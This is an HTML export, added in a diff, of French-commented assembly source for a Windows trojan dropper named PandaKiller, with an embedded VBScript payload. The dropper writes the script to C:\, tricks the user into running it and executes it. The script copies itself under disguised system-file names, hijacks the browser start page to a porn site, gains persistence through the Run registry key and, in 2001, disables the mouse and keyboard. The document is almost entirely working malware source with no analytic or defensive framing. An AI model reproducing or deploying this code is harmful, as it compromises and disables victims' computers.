@@ -1,0 +1,181 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc4 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	font-weight: bold;
+	color: #0000FF;
+}
+.sc8 {
+	font-weight: bold;
+	color: #8080FF;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc12 {
+	color: #808000;
+}
+.sc13 {
+	color: #808080;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Panda3.asm par PandaKiller                             03/10/00</span><span class="sc0">
+</span><span class="sc1">;TASM32 /M /ML panda3</span><span class="sc0">
+</span><span class="sc1">;TLINK32 -Tpe -x -aa panda3,,,import32</span><span class="sc0">
+
+</span><span class="sc2">.386</span><span class="sc0">
+</span><span class="sc5">locals</span><span class="sc0">
+</span><span class="sc5">jumps</span><span class="sc0">
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+
+</span><span class="sc9">.data</span><span class="sc0">
+</span><span class="sc5">octets</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">flz_handle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">nom_fichier</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'C:\Salut.vbs'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">prog</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'C:\Salut.vbs'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">TEXTE</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Salut ! Ca va ?'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">TITRE</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Hello'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">TEXTE2</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'J''ai mis un fichier sur ton ordinateur'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Il s'</span><span class="sc13">'appelle Salut.vbs et se trouve dans C:\',0dh,0ah
+</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Ouvre-le vite'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">TITRE2</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'FICHIER CREE'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">CLE</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'\Software\Microsoft\Windows\CurrentVersion'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">DONNEE</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'PandaKiller'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">NOM</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'RegisteredOwner'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">p</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">l</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
+
+</span><span class="sc5">DEBUTV</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'''VBS/PandaKiller.Trojan.A PAR Pentasm99 (c)2000  03/10/00'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'''SE COPIE DANS WINDOWS ET WINDOWS\SYSTEM'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DEBUT()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sub DEBUT()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set a = CreateObject("Scripting.FileSystemObject")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set win = a.GetSpecialFolder(0)'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set sys = a.GetSpecialFolder(1)'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set c = a.GetFile(WScript.ScriptFullName)'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c.Copy(win&amp;"\WSock32.dll.vbs")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c.Copy(sys&amp;"\PandaDwarf.txt.vbs")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'INTERNET()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'BUG2001()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set T = a.deletefile("C:\Salut.vbs")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'End Sub'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'''MODIFIE LA PAGE INTERNET ET RAJOUTE UN RESISTRE DANS "RUN"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sub INTERNET()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Dim W'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set W = Wscript.CreateObject("WScript.Shell")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'W.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\'
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Start Page", "http://www.penthouse.com"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'W.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\'
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'StartWindoz", "C:\WINDOWS\SYSTEM\WSock32.dll.vbs"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'End Sub'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'''DESACTIVE LA SOURIS ET LE CLAVIER EN 2001 ET EXECUTE WINMINE'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sub BUG2001()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'If Year(Now) = 2001 Then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'   Dim P'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'   Set P = Wscript.CreateObject("WScript.Shell")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'   P.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\'
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Stop1", "rundll32,mouse disable"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'   P.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\'
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Stop2", "rundll32,keyboard disable"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'   P.run ("C:\WINDOWS\Winmine.exe")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'End If'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'End Sub'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc5">taille</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">DEBUTV</span><span class="sc0">
+
+</span><span class="sc9">.code</span><span class="sc0">
+</span><span class="sc5">REGISTRE</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1F0000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CLE</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">                  </span><span class="sc1">;HKEY_LOCAL_MACHINE</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DONNEE</span><span class="sc0">              </span><span class="sc1">;PandaKiller</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NOM</span><span class="sc0">                 </span><span class="sc1">;DANS RegisteredOwner</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">             </span><span class="sc1">;CREE UN REGISTRE</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">                </span><span class="sc1">;FERME LA BASE DE REGISTRE</span><span class="sc0">
+</span><span class="sc5">FICHIER</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nom_fichier</span><span class="sc0">         </span><span class="sc1">;DONNE LE NOM DU FICHIER</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">flz_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">taille</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DEBUTV</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flz_handle</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flz_handle</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+</span><span class="sc5">MESSAGE</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TITRE</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TEXTE</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TITRE2</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TEXTE2</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prog</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc0">
+</span><span class="sc5">FIN</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
+</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">REGISTRE</span><span class="sc0">
+
+</span></div></body>
+</html>
